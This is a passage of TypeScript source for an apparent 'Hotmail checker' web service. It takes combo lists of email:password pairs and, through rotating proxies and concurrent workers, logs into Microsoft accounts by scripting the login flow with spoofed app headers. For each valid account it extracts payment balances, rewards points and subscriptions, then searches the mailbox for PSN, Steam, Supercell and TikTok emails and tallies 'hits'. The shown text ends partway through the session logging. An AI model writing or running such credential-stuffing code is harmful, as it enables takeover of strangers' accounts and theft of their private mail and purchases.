import { serve } from "https://deno.land/std@0.168.0/http/server.ts";
import { firebasePush, firebaseGet, verifyFirebaseIdToken } from "../_shared/firebase-admin.ts";

declare const EdgeRuntime: {
  waitUntil(promise: Promise<unknown>): void;
};

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type, x-firebase-token, x-client-ip",
};

interface ProxyConfig {
  type: 'http' | 'https' | 'socks4' | 'socks5' | 'none';
  host: string;
  port: number;
  username?: string;
  password?: string;
}

interface SubscriptionInfo {
  name: string;
  category: string;
  daysRemaining?: string;
  autoRenew?: string;
  isExpired?: boolean;
}

interface SessionInfo {
  startTime: string;
  endTime?: string;
  duration?: string;
  clientIP?: string;
  userAgent?: string;
  timezone?: string;
  country?: string;
  proxyUsed?: string;
  threadsUsed: number;
  accountsProcessed: number;
  successRate?: string;
}

interface CheckResult {
  email: string;
  password: string;
  status: string;
  country?: string;
  name?: string;
  checkedAt?: string;
  checkDuration?: number;
  proxyUsed?: string;
  threadId?: number;
  // Microsoft Subscriptions
  msStatus?: string;
  subscriptions?: SubscriptionInfo[];
  rewardsPoints?: string;
  balance?: string;
  // PSN
  psn?: {
    status: string;
    orders: number;
    purchases: any[];
  };
  // Steam
  steam?: {
    status: string;
    count: number;
    purchases?: any[];
  };
  // Supercell
  supercell?: {
    status: string;
    games: string[];
  };
  // TikTok
  tiktok?: {
    status: string;
    username?: string;
  };
  // Minecraft
  minecraft?: {
    status: string;
    username?: string;
    uuid?: string;
    capes?: string[];
  };
  error?: string;
}

// Parse proxy string into config (supports all formats)
function parseProxy(proxyStr: string): ProxyConfig | null {
  if (!proxyStr || proxyStr.trim() === '') return null;
  
  const trimmed = proxyStr.trim();
  
  // Format: protocol://user:pass@host:port
  const urlMatch = trimmed.match(/^(https?|socks[45]?):\/\/(?:([^:]+):([^@]+)@)?([^:]+):(\d+)$/i);
  if (urlMatch) {
    return {
      type: urlMatch[1].toLowerCase().replace('socks', 'socks5') as any,
      host: urlMatch[4],
      port: parseInt(urlMatch[5]),
      username: urlMatch[2],
      password: urlMatch[3]
    };
  }
  
  // Format: host:port:user:pass
  const parts = trimmed.split(':');
  if (parts.length === 4) {
    return {
      type: 'http',
      host: parts[0],
      port: parseInt(parts[1]),
      username: parts[2],
      password: parts[3]
    };
  }
  
  // Format: user:pass@host:port
  const authMatch = trimmed.match(/^([^:]+):([^@]+)@([^:]+):(\d+)$/);
  if (authMatch) {
    return {
      type: 'http',
      host: authMatch[3],
      port: parseInt(authMatch[4]),
      username: authMatch[1],
      password: authMatch[2]
    };
  }
  
  // Format: host:port
  if (parts.length === 2 && !isNaN(parseInt(parts[1]))) {
    return {
      type: 'http',
      host: parts[0],
      port: parseInt(parts[1])
    };
  }
  
  return null;
}

// Format proxy for display
function formatProxyDisplay(proxy: ProxyConfig | null): string {
  if (!proxy) return 'Direct';
  return `${proxy.type.toUpperCase()}://${proxy.host}:${proxy.port}`;
}

// Get current timestamp in Canary style
function getCanaryTimestamp(): string {
  const now = new Date();
  const day = now.toLocaleDateString('en-US', { weekday: 'short' });
  const date = now.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
  const time = now.toLocaleTimeString('en-US', { hour12: false, hour: '2-digit', minute: '2-digit', second: '2-digit' });
  const ms = now.getMilliseconds().toString().padStart(3, '0');
  return `[${day} ${date} ${time}.${ms}]`;
}

// Format duration in human readable format
function formatDuration(ms: number): string {
  if (ms < 1000) return `${ms}ms`;
  if (ms < 60000) return `${(ms / 1000).toFixed(2)}s`;
  const minutes = Math.floor(ms / 60000);
  const seconds = ((ms % 60000) / 1000).toFixed(1);
  return `${minutes}m ${seconds}s`;
}

// Check Microsoft Subscriptions (Xbox Game Pass, M365, etc)
async function checkMicrosoftSubscriptions(email: string, accessToken: string, cid: string): Promise<{
  status: string;
  subscriptions: SubscriptionInfo[];
  data: Record<string, string>;
}> {
  try {
    const userId = crypto.randomUUID().replace(/-/g, '').substring(0, 16);
    const stateJson = JSON.stringify({ userId, scopeSet: "pidl" });
    const paymentAuthUrl = `https://login.live.com/oauth20_authorize.srf?client_id=000000000004773A&response_type=token&scope=PIFD.Read+PIFD.Create+PIFD.Update+PIFD.Delete&redirect_uri=https%3A%2F%2Faccount.microsoft.com%2Fauth%2Fcomplete-silent-delegate-auth&state=${encodeURIComponent(stateJson)}&prompt=none`;
    
    const headers = {
      "Host": "login.live.com",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
      "Accept-Language": "en-US,en;q=0.5",
      "Connection": "keep-alive",
      "Referer": "https://account.microsoft.com/"
    };
    
    const r = await fetch(paymentAuthUrl, { headers, redirect: 'follow' });
    const searchText = (await r.text()) + " " + r.url;
    
    const tokenPatterns = [
      /access_token=([^&\s"']+)/,
      /"access_token":"([^"]+)"/
    ];
    
    let paymentToken = null;
    for (const pattern of tokenPatterns) {
      const match = searchText.match(pattern);
      if (match) {
        paymentToken = decodeURIComponent(match[1]);
        break;
      }
    }
    
    if (!paymentToken) {
      return { status: "FREE", subscriptions: [], data: {} };
    }
    
    const subData: Record<string, string> = {};
    const subscriptions: SubscriptionInfo[] = [];
    
    const paymentHeaders = {
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
      "Accept": "application/json",
      "Authorization": `MSADELEGATE1.0="${paymentToken}"`,
      "Content-Type": "application/json",
      "Host": "paymentinstruments.mp.microsoft.com",
      "ms-cV": crypto.randomUUID(),
      "Origin": "https://account.microsoft.com",
      "Referer": "https://account.microsoft.com/"
    };
    
    // Check payment instruments for balance
    try {
      const payUrl = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentInstrumentsEx?status=active,removed&language=en-US";
      const rPay = await fetch(payUrl, { headers: paymentHeaders });
      if (rPay.ok) {
        const payText = await rPay.text();
        const balanceMatch = payText.match(/"balance"\s*:\s*([0-9.]+)/);
        if (balanceMatch) {
          subData.balance = "$" + balanceMatch[1];
        }
      }
    } catch {}
    
    // Check Bing Rewards
    try {
      const rewardsR = await fetch("https://rewards.bing.com/", { headers: { "User-Agent": headers["User-Agent"] } });
      const rewardsText = await rewardsR.text();
      const pointsMatch = rewardsText.match(/"availablePoints"\s*:\s*(\d+)/);
      if (pointsMatch) {
        subData.rewardsPoints = pointsMatch[1];
      }
    } catch {}
    
    // Check subscriptions
    try {
      const transUrl = "https://paymentinstruments.mp.microsoft.com/v6.0/users/me/paymentTransactions";
      const rSub = await fetch(transUrl, { headers: paymentHeaders });
      
      if (rSub.ok) {
        const responseText = await rSub.text();
        
        const subscriptionKeywords: Record<string, { type: string; category: string }> = {
          'Xbox Game Pass Ultimate': { type: 'GAME PASS ULTIMATE', category: 'gaming' },
          'PC Game Pass': { type: 'PC GAME PASS', category: 'gaming' },
          'Xbox Game Pass': { type: 'GAME PASS', category: 'gaming' },
          'EA Play': { type: 'EA PLAY', category: 'gaming' },
          'Xbox Live Gold': { type: 'XBOX LIVE GOLD', category: 'gaming' },
          'Microsoft 365 Family': { type: 'M365 FAMILY', category: 'office' },
          'Microsoft 365 Personal': { type: 'M365 PERSONAL', category: 'office' },
          'Office 365': { type: 'OFFICE 365', category: 'office' },
          'OneDrive': { type: 'ONEDRIVE', category: 'storage' }
        };
        
        for (const [keyword, info] of Object.entries(subscriptionKeywords)) {
          if (responseText.includes(keyword)) {
            const subInfo: SubscriptionInfo = {
              name: info.type,
              category: info.category
            };
            
            const renewalMatch = responseText.match(/"nextRenewalDate"\s*:\s*"([^T"]+)/);
            if (renewalMatch) {
              const renewalDate = renewalMatch[1];
              try {
                const renewal = new Date(renewalDate + "T00:00:00Z");
                const today = new Date();
                const daysRemaining = Math.floor((renewal.getTime() - today.getTime()) / (1000 * 60 * 60 * 24));
                subInfo.daysRemaining = String(daysRemaining);
                if (daysRemaining < 0) {
                  subInfo.isExpired = true;
                }
              } catch {}
            }
            
            const autoMatch = responseText.match(/"autoRenew"\s*:\s*(true|false)/);
            if (autoMatch) {
              subInfo.autoRenew = autoMatch[1] === "true" ? "YES" : "NO";
            }
            
            subscriptions.push(subInfo);
          }
        }
        
        if (subscriptions.length > 0) {
          const activeSubs = subscriptions.filter(s => !s.isExpired);
          if (activeSubs.length > 0) {
            return { status: "PREMIUM", subscriptions, data: subData };
          }
        }
      }
    } catch {}
    
    return { status: "FREE", subscriptions, data: subData };
    
  } catch (error) {
    console.error("MS subscription check error:", error);
    return { status: "ERROR", subscriptions: [], data: {} };
  }
}

// Check Minecraft account
async function checkMinecraft(accessToken: string): Promise<{
  status: string;
  username?: string;
  uuid?: string;
  capes?: string[];
}> {
  try {
    const r = await fetch('https://api.minecraftservices.com/minecraft/profile', {
      headers: {
        'Authorization': `Bearer ${accessToken}`,
        'User-Agent': 'Outlook-Android/2.0'
      }
    });
    
    if (r.ok) {
      const data = await r.json();
      return {
        status: "OWNED",
        username: data.name || "Unknown",
        uuid: data.id || "",
        capes: (data.capes || []).map((cape: any) => cape.alias || "")
      };
    }
    
    return { status: "FREE" };
  } catch (error) {
    console.error("Minecraft check error:", error);
    return { status: "ERROR" };
  }
}

async function checkAccount(
  email: string, 
  password: string, 
  checkMode: string,
  threadId: number,
  proxy: ProxyConfig | null
): Promise<CheckResult> {
  const startTime = Date.now();
  const result: CheckResult = { 
    email, 
    password, 
    status: 'checking',
    checkedAt: getCanaryTimestamp(),
    threadId,
    proxyUsed: formatProxyDisplay(proxy)
  };
  
  try {
    const uuid = crypto.randomUUID();
    
    // Step 1: Check if MSAccount
    const idpUrl = `https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=${encodeURIComponent(email)}`;
    const idpRes = await fetch(idpUrl, {
      headers: {
        "X-OneAuth-AppName": "Outlook Lite",
        "X-Office-Version": "3.11.0-minApi24",
        "X-CorrelationId": uuid,
        "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
        "Host": "odc.officeapps.live.com",
        "Connection": "Keep-Alive",
        "Accept-Encoding": "gzip"
      }
    });
    
    const idpText = await idpRes.text();
    
    if (idpText.includes("Neither") || idpText.includes("Both") || 
        idpText.includes("Placeholder") || idpText.includes("OrgId")) {
      result.status = "invalid";
      result.error = "Not a Microsoft account";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    if (!idpText.includes("MSAccount")) {
      result.status = "invalid";
      result.error = "Not a Microsoft account";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    // Step 2: Get auth page
    const authUrl = `https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=${encodeURIComponent(email)}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D`;
    
    const authRes = await fetch(authUrl, {
      headers: {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Connection": "keep-alive"
      },
      redirect: 'follow'
    });
    
    const authText = await authRes.text();
    const finalUrl = authRes.url;
    
    // Extract PPFT and post URL
    const urlMatch = authText.match(/urlPost":"([^"]+)"/);
    const ppftMatch = authText.match(/name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"/);
    
    if (!urlMatch || !ppftMatch) {
      result.status = "error";
      result.error = "Failed to get auth tokens";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    const postUrl = urlMatch[1].replace(/\\\//g, "/");
    const ppft = ppftMatch[1];
    
    // Get cookies from response
    const cookies = authRes.headers.get("set-cookie") || "";
    
    // Step 3: Login
    const loginData = `i13=1&login=${encodeURIComponent(email)}&loginfmt=${encodeURIComponent(email)}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${encodeURIComponent(password)}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${encodeURIComponent(ppft)}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960`;
    
    const loginRes = await fetch(postUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Origin": "https://login.live.com",
        "Referer": finalUrl,
        "Cookie": cookies
      },
      redirect: 'manual'
    });
    
    const loginText = await loginRes.text();
    const loginLocation = loginRes.headers.get("location") || "";
    
    // Check for errors
    if (loginText.toLowerCase().includes("account or password is incorrect") || 
        (loginText.match(/error/gi) || []).length > 0) {
      result.status = "invalid";
      result.error = "Wrong password";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    if (loginText.includes("identity/confirm") || loginText.includes("Consent")) {
      result.status = "2fa";
      result.error = "2FA required";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    if (loginText.includes("account.live.com/Abuse")) {
      result.status = "locked";
      result.error = "Account locked";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    // Extract code from redirect
    const codeMatch = loginLocation.match(/code=([^&]+)/);
    if (!codeMatch) {
      result.status = "error";
      result.error = "No auth code received";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    const code = codeMatch[1];
    
    // Extract MSPCID from cookies
    const loginCookies = loginRes.headers.get("set-cookie") || "";
    const mspcidMatch = loginCookies.match(/MSPCID=([^;]+)/);
    const cid = mspcidMatch ? mspcidMatch[1].toUpperCase() : "";
    
    if (!cid) {
      result.status = "error";
      result.error = "No CID found";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    // Step 4: Get access token
    const tokenData = `client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code=${code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access`;
    
    const tokenRes = await fetch("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", {
      method: "POST",
      headers: {
        "Content-Type": "application/x-www-form-urlencoded"
      },
      body: tokenData
    });
    
    const tokenJson = await tokenRes.json();
    
    if (!tokenJson.access_token) {
      result.status = "error";
      result.error = "Failed to get access token";
      result.checkDuration = Date.now() - startTime;
      return result;
    }
    
    const accessToken = tokenJson.access_token;
    result.status = "valid";
    
    // Step 5: Get profile info
    try {
      const profileRes = await fetch("https://substrate.office.com/profileb2/v2.0/me/V1Profile", {
        headers: {
          "User-Agent": "Outlook-Android/2.0",
          "Authorization": `Bearer ${accessToken}`,
          "X-AnchorMailbox": `CID:${cid}`
        }
      });
      
      if (profileRes.ok) {
        const profile = await profileRes.json();
        result.country = profile.location || "";
        result.name = profile.displayName || "";
      }
    } catch (e) {
      console.error("Profile fetch error:", e);
    }
    
    // Check Microsoft Subscriptions if requested
    if (checkMode === "microsoft" || checkMode === "all") {
      try {
        const msResult = await checkMicrosoftSubscriptions(email, accessToken, cid);
        result.msStatus = msResult.status;
        result.subscriptions = msResult.subscriptions;
        if (msResult.data.rewardsPoints) result.rewardsPoints = msResult.data.rewardsPoints;
        if (msResult.data.balance) result.balance = msResult.data.balance;
      } catch (e) {
        console.error("MS check error:", e);
      }
    }
    
    // Check Minecraft if requested
    if (checkMode === "minecraft" || checkMode === "all") {
      try {
        const mcResult = await checkMinecraft(accessToken);
        result.minecraft = mcResult;
      } catch (e) {
        console.error("Minecraft check error:", e);
      }
    }
    
    // Check PSN if requested
    if (checkMode === "psn" || checkMode === "all") {
      try {
        const psnPayload = {
          "Cvid": crypto.randomUUID(),
          "Scenario": {"Name": "owa.react"},
          "TimeZone": "UTC",
          "TextDecorations": "Off",
          "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": "sony@txn-email.playstation.com OR sony@email02.account.sony.com OR PlayStation Order Number"},
            "Size": 50,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
          }]
        };
        
        const psnRes = await fetch("https://outlook.live.com/search/api/v2/query", {
          method: "POST",
          headers: {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": `Bearer ${accessToken}`,
            "X-AnchorMailbox": `CID:${cid}`,
            "Content-Type": "application/json"
          },
          body: JSON.stringify(psnPayload)
        });
        
        if (psnRes.ok) {
          const psnData = await psnRes.json();
          let orders = 0;
          const purchases: any[] = [];
          
          if (psnData.EntitySets?.[0]?.ResultSets?.[0]) {
            orders = psnData.EntitySets[0].ResultSets[0].Total || 0;
            
            const results = psnData.EntitySets[0].ResultSets[0].Results || [];
            for (const r of results.slice(0, 15)) {
              if (r.Preview) {
                const gamePatterns = [
                  /Thank you for purchasing\s+([^\.]+)/i,
                  /You've bought\s+([^\.]+)/i,
                  /Game:\s*([^\n\.]{3,60})/i
                ];
                for (const pattern of gamePatterns) {
                  const gameMatch = r.Preview.match(pattern);
                  if (gameMatch) {
                    purchases.push({ item: gameMatch[1].trim().substring(0, 60) });
                    break;
                  }
                }
              }
            }
          }
          
          result.psn = {
            status: orders > 0 ? "HAS_ORDERS" : "FREE",
            orders,
            purchases
          };
        }
      } catch (e) {
        console.error("PSN check error:", e);
      }
    }
    
    // Check Steam if requested
    if (checkMode === "steam" || checkMode === "all") {
      try {
        const steamPayload = {
          "Cvid": crypto.randomUUID(),
          "Scenario": {"Name": "owa.react"},
          "TimeZone": "UTC",
          "TextDecorations": "Off",
          "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": "noreply@steampowered.com Thank you for your Steam purchase"},
            "Size": 50,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
          }]
        };
        
        const steamRes = await fetch("https://outlook.live.com/search/api/v2/query", {
          method: "POST",
          headers: {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": `Bearer ${accessToken}`,
            "X-AnchorMailbox": `CID:${cid}`,
            "Content-Type": "application/json"
          },
          body: JSON.stringify(steamPayload)
        });
        
        if (steamRes.ok) {
          const steamData = await steamRes.json();
          let count = 0;
          const purchases: any[] = [];
          
          if (steamData.EntitySets?.[0]?.ResultSets?.[0]) {
            count = steamData.EntitySets[0].ResultSets[0].Total || 0;
            
            const results = steamData.EntitySets[0].ResultSets[0].Results || [];
            for (const r of results.slice(0, 10)) {
              if (r.Preview) {
                const gamePatterns = [
                  /Thank you for purchasing\s+([^\.]+)/i,
                  /You have purchased:\s*([^\n]+)/i
                ];
                for (const pattern of gamePatterns) {
                  const gameMatch = r.Preview.match(pattern);
                  if (gameMatch) {
                    purchases.push({ item: gameMatch[1].trim().substring(0, 60) });
                    break;
                  }
                }
              }
            }
          }
          
          result.steam = {
            status: count > 0 ? "HAS_PURCHASES" : "FREE",
            count,
            purchases
          };
        }
      } catch (e) {
        console.error("Steam check error:", e);
      }
    }
    
    // Check Supercell if requested
    if (checkMode === "supercell" || checkMode === "all") {
      try {
        const scPayload = {
          "Cvid": crypto.randomUUID(),
          "Scenario": {"Name": "owa.react"},
          "TimeZone": "UTC",
          "TextDecorations": "Off",
          "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": "noreply@id.supercell.com OR supercell"},
            "Size": 20,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
          }]
        };
        
        const scRes = await fetch("https://outlook.live.com/search/api/v2/query", {
          method: "POST",
          headers: {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": `Bearer ${accessToken}`,
            "X-AnchorMailbox": `CID:${cid}`,
            "Content-Type": "application/json"
          },
          body: JSON.stringify(scPayload)
        });
        
        if (scRes.ok) {
          const scData = await scRes.json();
          const games: string[] = [];
          
          if (scData.EntitySets?.[0]?.ResultSets?.[0]) {
            const total = scData.EntitySets[0].ResultSets[0].Total || 0;
            
            if (total > 0) {
              const results = scData.EntitySets[0].ResultSets[0].Results || [];
              for (const r of results) {
                const preview = r.Preview || "";
                if (preview.toLowerCase().includes("clash of clans")) games.push("CoC");
                if (preview.toLowerCase().includes("clash royale")) games.push("CR");
                if (preview.toLowerCase().includes("brawl stars")) games.push("BS");
                if (preview.toLowerCase().includes("hay day")) games.push("HD");
                if (preview.toLowerCase().includes("boom beach")) games.push("BB");
              }
            }
          }
          
          result.supercell = {
            status: games.length > 0 ? "LINKED" : "FREE",
            games: [...new Set(games)]
          };
        }
      } catch (e) {
        console.error("Supercell check error:", e);
      }
    }
    
    // Check TikTok if requested
    if (checkMode === "tiktok" || checkMode === "all") {
      try {
        const ttPayload = {
          "Cvid": crypto.randomUUID(),
          "Scenario": {"Name": "owa.react"},
          "TimeZone": "UTC",
          "TextDecorations": "Off",
          "EntityRequests": [{
            "EntityType": "Conversation",
            "ContentSources": ["Exchange"],
            "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
            "From": 0,
            "Query": {"QueryString": "tiktok@account.tiktok.com OR TikTok verification code"},
            "Size": 10,
            "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
          }]
        };
        
        const ttRes = await fetch("https://outlook.live.com/search/api/v2/query", {
          method: "POST",
          headers: {
            "User-Agent": "Outlook-Android/2.0",
            "Accept": "application/json",
            "Authorization": `Bearer ${accessToken}`,
            "X-AnchorMailbox": `CID:${cid}`,
            "Content-Type": "application/json"
          },
          body: JSON.stringify(ttPayload)
        });
        
        if (ttRes.ok) {
          const ttData = await ttRes.json();
          
          if (ttData.EntitySets?.[0]?.ResultSets?.[0]) {
            const total = ttData.EntitySets[0].ResultSets[0].Total || 0;
            
            result.tiktok = {
              status: total > 0 ? "LINKED" : "FREE",
              username: total > 0 ? "Detected" : undefined
            };
          }
        }
      } catch (e) {
        console.error("TikTok check error:", e);
      }
    }
    
    result.checkDuration = Date.now() - startTime;
    return result;
    
  } catch (e) {
    result.status = "error";
    result.error = String(e);
    result.checkDuration = Date.now() - startTime;
    return result;
  }
}

// Multi-threaded worker pool with proper concurrency control
async function processWithWorkerPool<T, R>(
  items: T[],
  concurrency: number,
  fn: (item: T, index: number, threadId: number) => Promise<R>,
  onProgress?: (completed: number, total: number, result: R) => void
): Promise<R[]> {
  const results: R[] = new Array(items.length);
  let currentIndex = 0;
  let completedCount = 0;
  const lock = { value: false };

  async function worker(threadId: number): Promise<void> {
    while (true) {
      // Simple lock mechanism
      while (lock.value) {
        await new Promise(r => setTimeout(r, 1));
      }
      lock.value = true;
      const index = currentIndex++;
      lock.value = false;
      
      if (index >= items.length) break;
      
      try {
        const result = await fn(items[index], index, threadId);
        results[index] = result;
        completedCount++;
        
        if (onProgress) {
          onProgress(completedCount, items.length, result);
        }
        
        // Log progress
        if (completedCount % 10 === 0 || completedCount === items.length) {
          console.log(`${getCanaryTimestamp()} Thread-${threadId}: Progress ${completedCount}/${items.length}`);
        }
      } catch (error) {
        results[index] = { error: String(error) } as R;
        completedCount++;
      }
      
      // Small delay to prevent overwhelming
      await new Promise(r => setTimeout(r, 50));
    }
  }

  // Create worker pool with specified concurrency
  const workers = Array(Math.min(concurrency, items.length))
    .fill(null)
    .map((_, i) => worker(i + 1));

  console.log(`${getCanaryTimestamp()} Starting ${workers.length} worker threads for ${items.length} items`);
  await Promise.all(workers);
  return results;
}

serve(async (req) => {
  if (req.method === "OPTIONS") {
    return new Response(null, { headers: corsHeaders });
  }

  const sessionStart = Date.now();
  const sessionStartTime = getCanaryTimestamp();
  
  // Get client IP from various headers
  const clientIP = req.headers.get("x-client-ip") || 
                   req.headers.get("x-forwarded-for")?.split(',')[0]?.trim() || 
                   req.headers.get("cf-connecting-ip") ||
                   req.headers.get("x-real-ip") ||
                   "Unknown";
  
  const userAgent = req.headers.get("user-agent") || "Unknown";

  try {
    // Verify Firebase auth token
    const firebaseToken = req.headers.get("x-firebase-token");
    let userId: string | null = null;
    let userEmail: string | null = null;
    
    if (firebaseToken) {
      const tokenData = await verifyFirebaseIdToken(firebaseToken);
      if (tokenData) {
        userId = tokenData.uid;
        userEmail = tokenData.email || null;
      }
    }

    const { 
      accounts, 
      checkMode = "all", 
      threads = 5, 
      saveHistory = true,
      proxies = [],
      clientInfo = {}
    } = await req.json();

    console.log(`${sessionStartTime} ═══════════════════════════════════════════════`);
    console.log(`${sessionStartTime} HOTMAIL CHECKER SESSION STARTED`);
    console.log(`${sessionStartTime} ═══════════════════════════════════════════════`);
    console.log(`${sessionStartTime} Client IP: ${clientIP}`);
    console.log(`${sessionStartTime} User Agent: ${userAgent.substring(0, 80)}`);
    console.log(`${sessionStartTime} User: ${userEmail || 'Anonymous'}`);
    console.log(`${sessionStartTime} Accounts: ${accounts?.length || 0}`);
    console.log(`${sessionStartTime} Threads: ${threads}`);
    console.log(`${sessionStartTime} Mode: ${checkMode.toUpperCase()}`);
    console.log(`${sessionStartTime} Proxies: ${proxies?.length || 0}`);
    console.log(`${sessionStartTime} ───────────────────────────────────────────────`);

    if (!accounts || !Array.isArray(accounts) || accounts.length === 0) {
      return new Response(
        JSON.stringify({ error: "No accounts provided" }),
        { status: 400, headers: { ...corsHeaders, "Content-Type": "application/json" } }
      );
    }

    // Check if user has service access (if authenticated)
    if (userId) {
      const userData = await firebaseGet<{ services?: string[]; isAdmin?: boolean }>(`users/${userId}`);
      const hasAccess = userData?.services?.includes("hotmail_validator") || 
                        userData?.services?.includes("all") ||
                        userData?.isAdmin;
      
      if (!hasAccess) {
        return new Response(
          JSON.stringify({ error: "You don't have access to this service" }),
          { status: 403, headers: { ...corsHeaders, "Content-Type": "application/json" } }
        );
      }
    }

    // Parse proxies
    const parsedProxies: (ProxyConfig | null)[] = proxies.map((p: string) => parseProxy(p));
    const validProxies = parsedProxies.filter(p => p !== null);
    
    if (validProxies.length > 0) {
      console.log(`${getCanaryTimestamp()} Loaded ${validProxies.length} proxies`);
      for (const p of validProxies.slice(0, 3)) {
        console.log(`${getCanaryTimestamp()} - ${formatProxyDisplay(p)}`);
      }
      if (validProxies.length > 3) {
        console.log(`${getCanaryTimestamp()} - ... and ${validProxies.length - 3} more`);
      }
    }

    const results: CheckResult[] = [];
    const stats = {
      total: accounts.length,
      valid: 0,
      invalid: 0,
      twoFa: 0,
      locked: 0,
      error: 0,
      msPremium: 0,
      msFree: 0,
      psnHits: 0,
      steamHits: 0,
      supercellHits: 0,
      tiktokHits: 0,
      minecraftHits: 0
    };

    // Process with multi-threaded worker pool
    // Hotmail checker is very network-heavy; cap concurrency to avoid CPU timeouts.
    const safeThreads = Math.max(1, Math.min(Number(threads) || 5, 10));
    const concurrency = Math.min(safeThreads, accounts.length, 10);

    const allResults = await processWithWorkerPool(
      accounts,
      concurrency,
      async (account: string, index: number, threadId: number) => {
        const [email, password] = account.split(":");
        if (!email || !password) {
          return { email: account, password: "", status: "error", error: "Invalid format", threadId } as CheckResult;
        }
        
        // Rotate through proxies if available
        const proxy = validProxies.length > 0 ? validProxies[index % validProxies.length] : null;
        
        return await checkAccount(email.trim(), password.trim(), checkMode, threadId, proxy);
      },
      (completed, total, result) => {
        // Update stats
        if (result.status === "valid") stats.valid++;
        else if (result.status === "invalid") stats.invalid++;
        else if (result.status === "2fa") stats.twoFa++;
        else if (result.status === "locked") stats.locked++;
        else stats.error++;
        
        if (result.msStatus === "PREMIUM") stats.msPremium++;
        if (result.psn?.status === "HAS_ORDERS") stats.psnHits++;
        if (result.steam?.status === "HAS_PURCHASES") stats.steamHits++;
        if (result.supercell?.status === "LINKED") stats.supercellHits++;
        if (result.tiktok?.status === "LINKED") stats.tiktokHits++;
        if (result.minecraft?.status === "OWNED") stats.minecraftHits++;
      }
    );

    const sessionEnd = Date.now();
    const sessionDuration = sessionEnd - sessionStart;
    const successRate = accounts.length > 0 ? ((stats.valid / accounts.length) * 100).toFixed(1) : "0";

    // Session info (Canary style)
    const sessionInfo: SessionInfo = {
      startTime: sessionStartTime,
      endTime: getCanaryTimestamp(),
      duration: formatDuration(sessionDuration),
      clientIP,
      userAgent: userAgent.substring(0, 100),
      timezone: clientInfo.timezone || "Unknown",
      country: clientInfo.country || "Unknown",
      proxyUsed: validProxies.length > 0 ? `${validProxies.length} proxies` : "Direct",
      threadsUsed: concurrency,
      accountsProcessed: accounts.length,
      successRate: `${successRate}%`
    };

    console.log(`${getCanaryTimestamp()} ═══════════════════════════════════════════════`);
    console.log(`${getCanaryTimestamp()} SESSION COMPLETE`);
    console.log(`${getCanaryTimestamp()} ═══════════════════════════════════════════════`);
    console.log(`${getCanaryTimestamp()} Duration: ${sessionInfo.duration}`);
    console.log(`${getCanaryTimestamp()} Processed: ${accounts.length} accounts`);
    console.log(`${getCanaryTimestamp()} Valid: ${stats.valid} (${successRate}%)`);
